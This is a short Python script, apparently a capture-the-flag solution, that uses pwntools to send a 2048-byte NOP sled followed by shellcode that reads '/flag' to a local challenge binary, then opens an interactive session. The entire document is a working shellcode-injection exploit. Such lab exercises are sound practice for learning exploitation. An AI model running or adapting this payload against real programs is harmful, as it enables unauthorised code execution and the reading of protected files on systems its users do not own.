"""NOP sled shellcode exploit: pad shellcode with NOPs for reliable landing."""

from pwn import *
from pwn import asm, context, process

context.update(arch="amd64", os="linux")
context.log_level = "error"

binary_path = "/challenge/ello-ackers"
p = process(binary_path)

nop_sled = b"\x90" * 2048

# have h bytes
shellcode = asm(shellcraft.cat("/flag"))

payload = nop_sled + shellcode
payload = payload.ljust(4096, b"\x90")

p.send(payload)
p.interactive()
